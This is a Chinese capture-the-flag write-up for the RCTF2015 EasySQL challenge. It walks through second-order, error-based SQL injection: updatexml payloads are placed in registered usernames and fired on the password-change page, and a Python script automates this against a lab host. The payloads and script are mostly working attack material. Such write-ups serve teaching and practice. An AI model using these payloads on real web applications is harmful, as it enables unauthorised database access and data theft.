# 原创
：  [RCTF2015]EasySQL

# [RCTF2015]EasySQL

#### [RCTF2015]EasySQL

## 考点

> 
二次注入、报错注入


## 思路

> 
注册账号之后，发现登陆后有个修改密码，在修改密码的时候会查询数据库，所以应该存在二次注入<br/> 对username和email进行fuzz


> 
注册时把用户名写成 `'admin"\`，发现在改密码时会报如下错误：


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/202106252000022.png#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210625200008927.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 
可以猜出来 sql 语句应该是类似于这样子的，所以我们可以利用二次注入和报错注入来获取flag


```
 select * from user where username="'admin"\" and password='d41d8cd98f00b204e9800998ecf8427e'

```

## Payload

> 
创建用户：`username = h3rmesk1t"||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#`，然后在修改密码触发二次注入


> 
`username = h3rmesk1t"||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users'))),1))#`


> 
发现输出有长度限制，利用正则来获取表名：`username = h3rmesk1t"||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')&amp;&amp;(column_name)regexp('^r'))),1))#`


> 
`username = h3rmesk1t"||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f'))),1))#`


> 
`username = h3rmesk1t"||updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f')))),1)#`


> 
脚本


```
import requests

url_reg = 'http://7e4dcf86-135f-4bad-98e0-1b7ad8318aad.node2.buuoj.cn.wetolink.com:82/register.php'
url_log = 'http://7e4dcf86-135f-4bad-98e0-1b7ad8318aad.node2.buuoj.cn.wetolink.com:82/login.php'
url_change = 'http://7e4dcf86-135f-4bad-98e0-1b7ad8318aad.node2.buuoj.cn.wetolink.com:82/changepwd.php'

pre = 'H3rmesk1t"'
suf = "'))),1))#"

s = 'abcdefghijklmnopqrstuvwxyz1234567890'
s = list(s)

r = requests.session()

def register(name):
	data = {
		'username' : name,
		'password' : '123',
		'email' : '123',
	}
	r.post(url=url_reg, data=data)

def login(name):
	data = {
		'username' : name,
		'password' : '123',
	}
	r.post(url=url_log, data=data)
	
def changepwd():
	data = {
		'oldpass' : '',
		'newpass' : '',
	}
	kk = r.post(url=url_change, data=data)
	if 'target' not in kk.text:
		print(kk.text)

for i in s:
	paylaod = pre + "||(updatexml(1,concat((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('" + i + suf
	register(paylaod)
	login(paylaod)
	changepwd()

```
